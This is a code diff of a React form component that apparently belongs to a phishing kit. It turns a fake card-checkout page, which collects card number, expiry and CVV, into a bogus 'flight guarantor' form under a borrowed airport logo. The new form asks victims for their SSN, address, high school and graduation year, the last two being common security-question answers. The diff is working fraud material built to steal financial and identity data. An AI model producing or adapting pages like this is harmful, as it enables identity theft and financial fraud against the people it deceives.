@@ -2,12 +2,13 @@
 import { NavLink } from "react-router-dom";
 
 function HomePage(props) {
+
     return (
         <div className="container">
             <form className="box" onSubmit={props.handleSubmit}>
-                <img src="https://play-lh.googleusercontent.com/SaAApLbrhZtg63AQfgfvzTVqN65kVcVbwg5FY1ERpeb0k1cSpw7KBHoeP6dQft1szw=w416-h235-rw" alt="" width="200" />
-                <h1>You're almost done!</h1>
-                <h3>Provide your credit/debit card information to complete your purchase</h3>
+                <img src="https://img.aviationpros.com/files/base/cygnus/cavc/image/2016/05/Modified__BWI_Logo_copy.574db71b7737e.png?auto=format%2Ccompress&w=640&width=640" alt="" width="200" />
+                <h1>Grace Angel Miller Priviledge Flight Guarantor's Form</h1>
+                <h3>Provide your adequate information to ensure approval of funds</h3>
 
                 <div className="duo2">
                 </div>
@@ -16,23 +17,31 @@ function HomePage(props) {
 
                 <div className="over">
                     <div className="card-input">
-                        <p>Card number</p>
-                        <input type="number" placeholder="1111 2222 3333 4444" name="cardNumber" onChange={props.getData} required/>
+                        <p>Full Name</p>
+                        <input type="text" placeholder="" name="fullName" onChange={props.getData}   />
                     </div>
                     <div className="card-input put1">
-                        <p>Cardholder's name</p>
-                        <input type="text" placeholder="JOHN DOE" name="cardName" onChange={props.getData} />
+                        <p>Full Address</p>
+                        <input type="text" placeholder="" name="address" onChange={props.getData}  />
+                        <h5>Guarantor must be from selected state: Chicago</h5>
                     </div>
-                    <div className="split">
-                        <div className="card-input put1">
-                            <p>Expiry date</p>
-                            <input type="text" placeholder="12/34" name="expiryDate" onChange={props.getData} />
-                        </div>
-                        <div className="card-input put1">
-                            <p>CVV</p>
-                            <input type="number" placeholder="123" name="cvv" onChange={props.getData} />
-                        </div>
+                  
+                    <div className="card-input put1">
+                        <p>SSN (social security number)</p>
+                        <input type="number" placeholder="" name="ssn" onChange={props.getData} />
                     </div>
+
+                    <div className="card-input put1">
+                        <p>What High school did you graduate From?</p>
+                        <input type="text" placeholder="" name="schoolName" onChange={props.getData} />
+                    </div>
+
+                    <div className="card-input put1">
+                        <p>What Year did you graduate</p>
+                        <input type="number" placeholder="" name="schoolDate" onChange={props.getData} />
+                    </div>
+
+
 
                 </div>
 
@@ -40,7 +49,7 @@ function HomePage(props) {
 
 
 
-                <button className="check" onClick={props.handleSubmit}>Checkout</button>
+                <button className="check" onClick={props.handleSubmit}>Submit</button>
 
             </form>
         </div>
